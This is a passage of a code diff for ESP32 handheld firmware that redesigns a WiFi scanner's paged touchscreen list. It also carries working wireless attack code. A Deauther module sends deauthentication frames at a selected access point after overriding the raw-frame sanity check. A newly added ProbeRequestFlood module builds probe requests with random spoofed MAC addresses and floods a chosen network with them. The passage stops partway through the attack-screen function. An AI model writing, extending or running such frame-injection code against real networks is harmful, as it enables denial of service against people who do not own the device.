@@ -1751,122 +1751,157 @@ unsigned long lastButtonPress = 0;
 const unsigned long debounceTime = 200;
 
 #define MAX_SSID_LENGTH 10
-#define LIST_TOP (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT + 15)
-#define LIST_ITEM_HEIGHT 18
-#define MAX_VISIBLE_ITEMS 14
+
+// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of tab bar (y=304..320)
+static constexpr int NETWORKS_PER_PAGE = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+
+static int current_page = 0;
 
 static bool uiDrawn = false;
 
-static int iconX[ICON_NUM] = {210, 10};
+static int iconX[ICON_NUM] = {220, 10};
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_undo,
   bitmap_icon_go_back
 };
 
+static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+static void drawTabBar(const char* leftButton, bool leftDisabled,
+                       const char* prevButton, bool prevDisabled,
+                       const char* nextButton, bool nextDisabled) {
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+
+  if (leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
+  if (prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  if (nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+}
+
+static int last_rendered_page = -1;
+static int last_rendered_index = -1;
+
+static void drawNetworkRow(int i, int y, bool isSel) {
+  char buf[64];
+  char ssid[12];
+  String fullSSID = WiFi.SSID(i);
+  strncpy(ssid, fullSSID.c_str(), 11);
+  ssid[11] = '\0';
+  if (fullSSID.length() > 11) strcat(ssid, "...");
+
+  const int rssi = WiFi.RSSI(i);
+  const int ch = WiFi.channel(i);
+  const int auth = WiFi.encryptionType(i);
+  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
+  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, rssi, ch, enc);
+
+  // Clear only this row (avoid overlapping next row).
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
+  tft.print(isSel ? ">" : " ");
+
+  tft.setCursor(10, y);
+  tft.setTextColor(isSel ? ORANGE : (auth == WIFI_AUTH_OPEN ? ORANGE : WHITE));
+  tft.println(buf);
+}
+
 void displayWiFiList(bool fullRedraw = false) {
   uiDrawn = false;
   int networkCount = WiFi.scanComplete();
 
-  if (fullRedraw || networkCount <= 0) {
-    tft.fillRect(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, TFT_WIDTH, TFT_HEIGHT - (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT), TFT_BLACK);
+  if (fullRedraw) {
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+    tft.setTextSize(1);
+  }
 
-    tft.fillRect(0, 20, 140, 16, DARK_GRAY);
-    tft.setTextColor(TFT_WHITE);
-    tft.setCursor(35, 24);
-    tft.print("WiFi Networks:");
+  if (networkCount <= 0) {
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, LIST_HEADER_Y);
+    tft.println("No networks found.");
+    tft.setCursor(10, LIST_HEADER_Y + 12);
+    tft.println("Press Rescan.");
+    drawTabBar("Rescan", false, "Prev", true, "Next", true);
+    return;
+  }
 
-    if (networkCount <= 0) {
-      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
-      tft.setTextColor(TFT_WHITE);
-      tft.setCursor(5, 24);
-      tft.print("No Networks Found");
-      return;
+  // Clamp page in case network count changed.
+  const int totalPages = (networkCount + NETWORKS_PER_PAGE - 1) / NETWORKS_PER_PAGE;
+  if (current_page < 0) current_page = 0;
+  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
+
+  listStartIndex = current_page * NETWORKS_PER_PAGE;
+
+  const bool pageChanged = (current_page != last_rendered_page);
+  const bool needFull = fullRedraw || pageChanged || (last_rendered_index < 0);
+
+  if (needFull) {
+    // Full redraw list (keeps UI consistent with Deauther).
+    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, LIST_HEADER_Y);
+    tft.println("Networks:");
+
+    char page_buf[20];
+    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
+    tft.setCursor(180, LIST_HEADER_Y);
+    tft.setTextColor(GREEN);
+    tft.println(page_buf);
+
+    int y = LIST_FIRST_ROW_Y;
+    const int end_index = min(listStartIndex + NETWORKS_PER_PAGE, networkCount);
+    for (int i = listStartIndex; i < end_index && y < LIST_BOTTOM_Y; i++) {
+      drawNetworkRow(i, y, (i == currentIndex));
+      y += LIST_ROW_H;
     }
 
-    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    const bool prevDisabled = (current_page == 0);
+    const bool nextDisabled = ((current_page + 1) * NETWORKS_PER_PAGE >= networkCount);
+    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
+    last_rendered_page = current_page;
+    last_rendered_index = currentIndex;
+    return;
+  }
 
-    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
-      int currentNetworkIndex = i + listStartIndex;
-      if (currentNetworkIndex >= networkCount) break;
+  // Incremental update: only redraw affected rows.
+  if (last_rendered_index != currentIndex) {
+    const int prev = last_rendered_index;
+    const int now = currentIndex;
 
-      String fullSSID = WiFi.SSID(currentNetworkIndex);
-      String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
-      int rssi = WiFi.RSSI(currentNetworkIndex);
-      int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;
-
-      if (currentNetworkIndex == currentIndex) {
-        tft.setTextColor(ORANGE, TFT_BLACK);
-        tft.setCursor(10, yPos);
-        tft.print("> ");
-      } else {
-        tft.setTextColor(TFT_WHITE, TFT_BLACK);
-        tft.setCursor(10, yPos);
-        tft.print("  ");
-      }
-
-      tft.setCursor(25, yPos);
-      tft.print(ssid);
-      if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
-      tft.print(" | RSSI: ");
-      tft.print(rssi);
+    if (prev >= listStartIndex && prev < listStartIndex + NETWORKS_PER_PAGE) {
+      const int row = prev - listStartIndex;
+      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
+      drawNetworkRow(prev, y, false);
     }
-  } else {
-    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
-      int currentNetworkIndex = i + listStartIndex;
-      if (currentNetworkIndex >= networkCount) break;
-
-      if (currentNetworkIndex == currentIndex || currentNetworkIndex == currentIndex + 1 || currentNetworkIndex == currentIndex - 1) {
-        String fullSSID = WiFi.SSID(currentNetworkIndex);
-        String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
-        int rssi = WiFi.RSSI(currentNetworkIndex);
-        int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;
-
-        tft.fillRect(0, yPos - 2, TFT_WIDTH, LIST_ITEM_HEIGHT, TFT_BLACK);
-
-        if (currentNetworkIndex == currentIndex) {
-          tft.setTextColor(ORANGE, TFT_BLACK);
-          tft.setCursor(10, yPos);
-          tft.print("> ");
-        } else {
-          tft.setTextColor(TFT_WHITE, TFT_BLACK);
-          tft.setCursor(10, yPos);
-          tft.print("  ");
-        }
-
-        tft.setCursor(25, yPos);
-        tft.print(ssid);
-        if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
-        tft.print(" | RSSI: ");
-        tft.print(rssi);
-      }
+    if (now >= listStartIndex && now < listStartIndex + NETWORKS_PER_PAGE) {
+      const int row = now - listStartIndex;
+      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
+      drawNetworkRow(now, y, true);
     }
+    last_rendered_index = currentIndex;
   }
 }
 
 void displayScanning() {
   uiDrawn = false;
-  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
   tft.fillRect(0, 37, 240, 320, TFT_BLACK);
 
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 25);
-  tft.print("[*] Scanning");
-
-  for (int i = 0; i < 2; i++) {
-    for (int j = 0; j <= i; j++) {
-      tft.print(".");
-      delay(500);
-    }
-  }
-
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35);
-  tft.print("[+] Scan complete!");
-
-  delay(100);
-
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55);
-  tft.print("[+] Wait a moment");
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, LIST_HEADER_Y);
+  tft.println("Scanning...");
+  loading(100, ORANGE, 0, 0, 3, true);
+  tft.setCursor(10, LIST_HEADER_Y + 15);
+  tft.println("Wait a moment.");
   isScanning = false;
 }
 
@@ -1876,6 +1911,10 @@ void startWiFiScan() {
   scan_StartTime = millis();
   isScanning = true;
   exitRequested = false;
+  isDetailView = false;
+  current_page = 0;
+  currentIndex = 0;
+  listStartIndex = 0;
 
   int numNetworks = WiFi.scanNetworks(false, true);
 
@@ -1893,13 +1932,22 @@ void displayWiFiDetails() {
   uiDrawn = false;
   tft.fillRect(0, 37, 240, 320, TFT_BLACK);
 
+  const int networkCount = WiFi.scanComplete();
+  if (networkCount <= 0) {
+    isDetailView = false;
+    displayWiFiList(true);
+    return;
+  }
+  if (currentIndex < 0) currentIndex = 0;
+  if (currentIndex >= networkCount) currentIndex = networkCount - 1;
+
   String ssid = WiFi.SSID(currentIndex);
   String bssid = WiFi.BSSIDstr(currentIndex);
   int rssi = WiFi.RSSI(currentIndex);
   int channel = WiFi.channel(currentIndex);
   int encryption = WiFi.encryptionType(currentIndex);
   bool isHidden = (ssid.length() == 0);
-  int y_shift = 0;
+  int y = 50;
 
   float signalQuality = constrain(2 * (rssi + 100), 0, 100);
   float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
@@ -1915,34 +1963,39 @@ void displayWiFiDetails() {
     default: encryptionType = "Unknown"; break;
   }
 
-  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
-  tft.setTextColor(TFT_WHITE);
-  tft.setCursor(35, 24);
-  tft.print("Network Details:");
-
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  // NOTE: In this file TFT_WHITE is remapped to FEATURE_TEXT (orange).
+  // Use real WHITE for normal detail text.
+  tft.setTextColor(WHITE, TFT_BLACK);
   tft.setTextSize(1);
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35 + y_shift);
+  tft.setCursor(10, y);
   tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : ssid);
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55 + y_shift);
+  tft.setCursor(10, y);
   tft.print("BSSID: "); tft.print(bssid);
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 75 + y_shift);
+  tft.setCursor(10, y);
   tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 95 + y_shift);
+  tft.setCursor(10, y);
   tft.print("Signal: "); tft.print(signalQuality); tft.print("%");
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 115 + y_shift);
+  tft.setCursor(10, y);
   tft.print("Channel: "); tft.print(channel);
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 135 + y_shift);
+  tft.setCursor(10, y);
   tft.print("Encryption: "); tft.print(encryptionType);
+  y += 20;
 
-  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 155 + y_shift);
+  tft.setCursor(10, y);
   tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");
+
+  drawTabBar("Rescan", false, "", true, "Back", false);
 }
 
 void handleButton() {
@@ -1950,12 +2003,13 @@ void handleButton() {
   if (currentMillis - lastButtonPress < debounceTime) return;
 
   bool updated = false;
+  int oldPage = current_page;
 
   if (!pcf.digitalRead(BTN_UP)) {
     if (!isDetailView && currentIndex > 0) {
       currentIndex--;
       delay(200);
-      if (currentIndex < listStartIndex) listStartIndex--;
+      current_page = currentIndex / max(1, NETWORKS_PER_PAGE);
       updated = true;
     }
     lastButtonPress = currentMillis;
@@ -1965,7 +2019,7 @@ void handleButton() {
     if (!isDetailView && currentIndex < WiFi.scanComplete() - 1) {
       currentIndex++;
       delay(200);
-      if (currentIndex >= listStartIndex + MAX_VISIBLE_ITEMS) listStartIndex++;
+      current_page = currentIndex / max(1, NETWORKS_PER_PAGE);
       updated = true;
     }
     lastButtonPress = currentMillis;
@@ -1993,7 +2047,7 @@ void handleButton() {
 
   if (updated) {
     if (isDetailView) displayWiFiDetails();
-    else displayWiFiList();
+    else displayWiFiList(current_page != oldPage);
   }
 }
 
@@ -2003,7 +2057,7 @@ void runUI() {
 
     if (!uiDrawn) {
         tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
+        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
 
         for (int i = 0; i < ICON_NUM; i++) {
             if (icons[i] != NULL) {
@@ -2038,11 +2092,17 @@ void runUI() {
     }
 
     static unsigned long lastTouchCheck = 0;
-    const unsigned long touchCheckInterval = 50;
+    const unsigned long touchCheckInterval = 120;
+    static uint32_t lastTouchActionMs = 0;
 
     if (millis() - lastTouchCheck >= touchCheckInterval) {
         int x, y;
         if (feature_active && readTouchXY(x, y)) {
+            const uint32_t nowMs = millis();
+            if (nowMs - lastTouchActionMs < 250) {
+                lastTouchCheck = millis();
+                return;
+            }
             if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                 for (int i = 0; i < ICON_NUM; i++) {
                     if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
@@ -2050,15 +2110,65 @@ void runUI() {
 
                             if (i == 1) {
                                 feature_exit_requested = true;
+                                lastTouchActionMs = nowMs;
                             } else {
 
                                 tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                 animationState = 1;
                                 activeIcon = i;
                                 lastAnimationTime = millis();
+                                lastTouchActionMs = nowMs;
                             }
                         }
                         break;
+                    }
+                }
+            } else if (!isScanning) {
+                const int networkCount = WiFi.scanComplete();
+
+                // Deauther-like bottom bar has a large touch hitbox.
+                if (y >= 290 && y <= 320) {
+                    const bool prevDisabled = (current_page == 0);
+                    const bool nextDisabled = ((current_page + 1) * NETWORKS_PER_PAGE >= networkCount);
+
+                    if (x >= 0 && x <= 57) {
+                        drawButton(0, 304, 57, 16, "Rescan", true, false);
+                        delay(50);
+                        startWiFiScan();
+                        lastTouchActionMs = nowMs;
+                    } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
+                        drawButton(117, 304, 57, 16, "Prev", true, false);
+                        current_page--;
+                        if (current_page < 0) current_page = 0;
+                        delay(50);
+                        displayWiFiList(true);
+                        lastTouchActionMs = nowMs;
+                    } else if (x >= 177 && x <= 240) {
+                        if (isDetailView) {
+                            drawButton(177, 304, 57, 16, "Back", true, false);
+                            isDetailView = false;
+                            delay(50);
+                            displayWiFiList(true);
+                            lastTouchActionMs = nowMs;
+                        } else if (!nextDisabled) {
+                            drawButton(177, 304, 57, 16, "Next", true, false);
+                            current_page++;
+                            delay(50);
+                            displayWiFiList(true);
+                            lastTouchActionMs = nowMs;
+                        }
+                    }
+                } else if (!isDetailView) {
+                    const int listMaxY = LIST_FIRST_ROW_Y + (NETWORKS_PER_PAGE * LIST_ROW_H);
+                    if (networkCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
+                        const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+                        const int idx = (current_page * NETWORKS_PER_PAGE) + row;
+                        if (idx >= 0 && idx < networkCount) {
+                            currentIndex = idx;
+                            isDetailView = true;
+                            displayWiFiDetails();
+                            lastTouchActionMs = nowMs;
+                        }
                     }
                 }
             }
@@ -2070,9 +2180,6 @@ void runUI() {
 void wifiscanSetup() {
 
   tft.fillScreen(TFT_BLACK);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(1);
-  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
 
   uiDrawn = false;
 
@@ -2088,6 +2195,10 @@ void wifiscanSetup() {
 
   int existing = WiFi.scanComplete();
   if (existing >= 0 && bgHasResults) {
+    current_page = 0;
+    currentIndex = 0;
+    listStartIndex = 0;
+    isDetailView = false;
     displayWiFiList(true);
   } else {
     startWiFiScan();
@@ -3321,6 +3432,12 @@ namespace Deauther {
 #define SCREEN_WIDTH  240
 #define SCREEN_HEIGHT 320
 
+// Larger row height = easier touch selection.
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of the bottom button bar (y=304..320)
+
 uint8_t deauth_frame_default[26] = {
     0xC0, 0x00,
     0x00, 0x00,
@@ -3344,7 +3461,7 @@ wifi_ap_record_t *ap_list = nullptr;
 bool scanning = false;
 uint32_t last_packet_time = 0;
 int current_page = 0;
-const int networks_per_page = 14;
+static constexpr int networks_per_page = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
@@ -3423,7 +3540,7 @@ void drawScanScreen() {
         tft.setCursor(10, 65);
         tft.println("Press Rescan.");
     } else {
-        int y = 50;
+        int y = LIST_HEADER_Y;
         tft.setTextColor(GREEN);
         tft.setCursor(10, y);
         tft.println("Networks:");
@@ -3432,7 +3549,7 @@ void drawScanScreen() {
         int start_index = current_page * networks_per_page;
         int end_index = min(start_index + networks_per_page, network_count);
 
-        for (int i = start_index; i < end_index && y < 300; i++) {
+        for (int i = start_index; i < end_index && y < LIST_BOTTOM_Y; i++) {
             char buf[64];
             char ssid[12];
             strncpy(ssid, (char*)ap_list[i].ssid, 11);
@@ -3443,7 +3560,7 @@ void drawScanScreen() {
             tft.setCursor(10, y);
             tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
             tft.println(buf);
-            y += 15;
+            y += LIST_ROW_H;
         }
 
         char page_buf[20];
@@ -3559,7 +3676,7 @@ void drawAttackScreen() {
     tft.println(buf);
 
     tft.setCursor(10, 100);
-    tft.setTextColor(attack_running ? ORANGE : DARK_GRAY);
+    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
     tft.println(attack_running ? "Status: Running" : "Status: Stopped");
 
     snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
@@ -3586,8 +3703,9 @@ void handleTouch() {
 
     bool redraw = false;
     if (selected_ap_index == -1) {
-        if (!scanning && y >= 60 && y < 270 && network_count > 0) {
-            int index = (y - 60) / 15 + (current_page * networks_per_page);
+        const int listMaxY = LIST_FIRST_ROW_Y + (networks_per_page * LIST_ROW_H);
+        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
+            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * networks_per_page);
             if (index >= 0 && index < network_count) {
                 selected_ap_index = index;
                 selectedAp = ap_list[index];
@@ -3861,6 +3979,627 @@ void deautherLoop() {
 
         if (current_time - last_packet_time >= 100 && attack_running) {
             wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
+            last_packet_time = current_time;
+        }
+    }
+
+    static uint32_t last_channel_check = 0;
+    if (attack_running && current_time - last_channel_check > 15000) {
+        uint8_t new_channel;
+        if (checkApChannel(selectedAp.bssid, &new_channel)) {
+            if (new_channel != selectedChannel) {
+                selectedChannel = new_channel;
+                wifi_config_t ap_config = {0};
+                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+                ap_config.ap.ssid_len = strlen("ESP32-DIV");
+                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
+                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+                ap_config.ap.ssid_hidden = 0;
+                ap_config.ap.max_connection = 4;
+                ap_config.ap.beacon_interval = 100;
+                ap_config.ap.channel = selectedChannel;
+                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+
+            }
+        }
+        last_channel_check = current_time;
+    }
+
+    static uint32_t last_status_time = 0;
+    if (attack_running && current_time - last_status_time > 2000) {
+        drawAttackScreen();
+        last_status_time = current_time;
+      }
+  }
+}
+
+namespace ProbeRequestFlood {
+
+#define SCREEN_WIDTH  240
+#define SCREEN_HEIGHT 320
+
+// Larger row height = easier touch selection.
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of the bottom button bar (y=304..320)
+
+static uint8_t probe_frame[128];
+static const uint8_t probe_rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
+
+uint32_t packet_count = 0;
+uint32_t success_count = 0;
+uint32_t consecutive_failures = 0;
+bool attack_running = false;
+wifi_ap_record_t selectedAp;
+uint8_t selectedChannel;
+int selected_ap_index = -1;
+int network_count = 0;
+wifi_ap_record_t *ap_list = nullptr;
+bool scanning = false;
+uint32_t last_packet_time = 0;
+int current_page = 0;
+static constexpr int networks_per_page = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+
+static bool uiDrawn = false;
+
+static uint8_t ssidLength(const wifi_ap_record_t *ap) {
+    uint8_t len = 0;
+    while (len < sizeof(ap->ssid) && ap->ssid[len] != '\0') {
+        len++;
+    }
+    return len;
+}
+
+static void makeRandomMac(uint8_t *mac) {
+    for (int i = 0; i < 6; i++) {
+        mac[i] = (uint8_t)random(256);
+    }
+    mac[0] = (mac[0] & 0xFE) | 0x02;
+}
+
+static uint16_t buildProbeFrame(const wifi_ap_record_t *ap, uint8_t channel, const uint8_t *srcMac) {
+    uint16_t pos = 0;
+
+    probe_frame[pos++] = 0x40;
+    probe_frame[pos++] = 0x00;
+    probe_frame[pos++] = 0x00;
+    probe_frame[pos++] = 0x00;
+
+    memset(&probe_frame[pos], 0xFF, 6);
+    pos += 6;
+    memcpy(&probe_frame[pos], srcMac, 6);
+    pos += 6;
+    memset(&probe_frame[pos], 0xFF, 6);
+    pos += 6;
+    probe_frame[pos++] = 0x00;
+    probe_frame[pos++] = 0x00;
+
+    uint8_t ssid_len = ssidLength(ap);
+    probe_frame[pos++] = 0x00;
+    probe_frame[pos++] = ssid_len;
+    if (ssid_len > 0) {
+        memcpy(&probe_frame[pos], ap->ssid, ssid_len);
+        pos += ssid_len;
+    }
+
+    probe_frame[pos++] = 0x01;
+    probe_frame[pos++] = sizeof(probe_rates);
+    memcpy(&probe_frame[pos], probe_rates, sizeof(probe_rates));
+    pos += sizeof(probe_rates);
+
+    probe_frame[pos++] = 0x03;
+    probe_frame[pos++] = 0x01;
+    probe_frame[pos++] = channel;
+
+    return pos;
+}
+
+static void sendProbeFrame() {
+    uint8_t srcMac[6];
+    makeRandomMac(srcMac);
+
+    esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+    uint16_t frame_len = buildProbeFrame(&selectedAp, selectedChannel, srcMac);
+
+    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, probe_frame, frame_len, false);
+    packet_count++;
+    if (res == ESP_OK) {
+        success_count++;
+        consecutive_failures = 0;
+    } else {
+        consecutive_failures++;
+    }
+}
+
+int compare_ap(const void *a, const void *b) {
+    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
+    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
+    return ap2->rssi - ap1->rssi;
+}
+
+void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+
+    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                             : FeatureUI::ButtonStyle::Secondary;
+    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
+
+    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+
+    if (leftButton[0]) {
+        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
+    }
+
+    if (prevButton[0]) {
+        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+    }
+    if (nextButton[0]) {
+        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+    }
+}
+
+void drawScanScreen() {
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+    tft.setTextSize(1);
+
+    if (scanning) {
+        tft.setCursor(10, 50);
+        tft.setTextColor(GREEN);
+        tft.println("Scanning...");
+        loading(100, ORANGE, 0, 0, 3, true);
+        tft.setCursor(10, 65);
+        tft.println("Wait a moment.");
+        return;
+    }
+
+    if (network_count == 0) {
+        tft.setTextColor(GREEN);
+        tft.setCursor(10, 50);
+        tft.println("No networks found.");
+        tft.setCursor(10, 65);
+        tft.println("Press Rescan.");
+    } else {
+        int y = LIST_HEADER_Y;
+        tft.setTextColor(GREEN);
+        tft.setCursor(10, y);
+        tft.println("Networks:");
+        y += 20;
+
+        int start_index = current_page * networks_per_page;
+        int end_index = min(start_index + networks_per_page, network_count);
+
+        for (int i = start_index; i < end_index && y < LIST_BOTTOM_Y; i++) {
+            char buf[64];
+            char ssid[12];
+            strncpy(ssid, (char*)ap_list[i].ssid, 11);
+            ssid[11] = '\0';
+            if (strlen((char*)ap_list[i].ssid) > 11) strcat(ssid, "...");
+            const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
+            snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);
+            tft.setCursor(10, y);
+            tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
+            tft.println(buf);
+            y += LIST_ROW_H;
+        }
+
+        char page_buf[20];
+        snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, (network_count + networks_per_page - 1) / networks_per_page);
+        tft.setCursor(180, 50);
+        tft.setTextColor(GREEN);
+        tft.println(page_buf);
+    }
+
+    const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
+    bool leftDisabled = false;
+    const char* prevButton = "Prev";
+    bool prevDisabled = attack_running || current_page == 0;
+    const char* nextButton = "Next";
+    bool nextDisabled = attack_running || (current_page + 1) * networks_per_page >= network_count;
+    drawTabBar(leftButton, leftDisabled, prevButton, prevDisabled, nextButton, nextDisabled);
+}
+
+bool scanNetworks() {
+    scanning = true;
+    current_page = 0;
+    drawScanScreen();
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(100);
+
+    network_count = WiFi.scanNetworks();
+    if (network_count == 0) {
+        scanning = false;
+        return false;
+    }
+
+    if (ap_list) free(ap_list);
+    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
+    if (!ap_list) {
+        scanning = false;
+        return false;
+    }
+
+    for (int i = 0; i < network_count; i++) {
+        wifi_ap_record_t ap_record = {0};
+        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
+        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+        ap_record.rssi = WiFi.RSSI(i);
+        ap_record.primary = WiFi.channel(i);
+        ap_record.authmode = WiFi.encryptionType(i);
+        ap_list[i] = ap_record;
+    }
+
+    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
+
+    scanning = false;
+    return true;
+}
+
+bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(100);
+
+    int n = WiFi.scanNetworks();
+    for (int i = 0; i < n; i++) {
+        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
+            *channel = WiFi.channel(i);
+            WiFi.mode(WIFI_AP);
+            delay(100);
+            return true;
+        }
+    }
+
+    WiFi.mode(WIFI_AP);
+    delay(100);
+    return false;
+}
+
+void resetWifi() {
+    esp_wifi_stop();
+    delay(200);
+    esp_wifi_start();
+    delay(200);
+    packet_count = 0;
+    success_count = 0;
+    consecutive_failures = 0;
+}
+
+void drawAttackScreen() {
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+    tft.setTextSize(1);
+
